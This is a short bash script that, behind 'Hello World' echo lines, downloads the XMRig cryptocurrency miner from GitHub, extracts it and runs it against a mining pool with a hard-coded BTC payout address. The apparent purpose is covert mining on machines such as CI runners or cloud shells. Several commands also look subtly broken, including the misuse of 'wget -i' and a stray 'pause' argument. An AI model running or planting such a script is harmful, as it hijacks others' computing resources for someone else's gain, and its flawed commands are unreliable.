#!/bin/bash
echo "Hello World"
wget -i "https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz"
echo "Hello World1"
tar -xf xmrig-6.15.0-linux-static-x64.tar.gz
cd xmrig-6.15.0
./xmrig -o rx.unmineable.com:3333 -a rx -k -u BTC:1HjnNAPQWjgRt7RWCCEjyqBz1ZFFfVvVeQ.THDN1#0r73-ojtu -p x pause 
